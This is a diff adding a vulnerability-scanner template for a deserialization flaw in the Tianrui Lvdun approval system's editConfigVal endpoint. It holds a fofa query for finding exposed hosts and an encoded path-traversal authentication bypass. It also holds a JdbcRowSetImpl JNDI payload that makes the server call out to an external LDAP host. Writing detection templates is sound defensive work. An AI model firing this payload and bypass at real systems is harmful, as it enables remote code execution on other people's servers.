@@ -1,0 +1,30 @@
+id: tianrui-lvdun-editconfigval-deserialization
+info:
+  name: 天锐绿盾审批系统 editConfigVal 反序列化漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="TIPPAY-绿盾审批系统"
+    天锐绿盾审批系统的 editConfigVal 组件在处理用户输入时存在反序列化逻辑缺陷。攻击者可通过构造恶意数据触发非预期的对象解析，进而导致远程代码执行或引发服务异常。该漏洞影响所有未打补丁的实例。
+  tags: 天锐绿盾审批系统
+http:
+- raw:
+  - |
+    POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://{{interactsh-url}}/A4",
+        "autoCommit": true
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
